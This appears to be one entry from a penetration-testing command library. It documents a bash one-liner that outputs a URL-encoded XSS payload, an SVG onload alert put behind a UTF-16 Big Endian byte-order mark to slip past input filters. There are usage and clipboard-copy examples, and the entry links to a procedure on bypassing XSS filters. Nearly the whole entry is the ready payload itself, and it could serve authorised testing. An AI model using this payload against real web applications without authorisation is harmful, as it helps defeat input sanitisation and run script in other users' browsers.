---
id: f62463c5-d6d8-48b3-9e20-cc96fcd4bc0f
name: output-utf16-xss-payload
type: command
executor: bash
data: >-
  echo -n
  '%fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E'
output: >-
  %fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E
created_at: '2023-04-06T03:56:43.117561+00:00'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
  - macOS
tags:
  - xss
  - payload
  - bypass
verified: true
validated: true
---

# output-utf16-xss-payload

## Command

```bash
echo -n '%fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E'
```

## Description

Outputs a URL-encoded XSS payload prepended with UTF-16 Big Endian BOM, using an SVG onload alert for execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Static payload | Yes |

## Examples

### Basic Usage

```bash
echo -n '%fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E'
```

### Copy to Clipboard (Linux)

```bash
echo -n '%fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E' | xclip -selection clipboard
```

## Expected Output

%fe%ff%00%3C%00s%00v%00g%00/%00o%00n%00l%00o%00a%00d%00=%00a%00l%00e%00r%00t%00(%00)%00%3E

## Related

- [[procedures/Bypassing-XSS-Filters-Using-UTF-BOM-Character]]
- [[commands/output-utf16-big-endian-bom]]
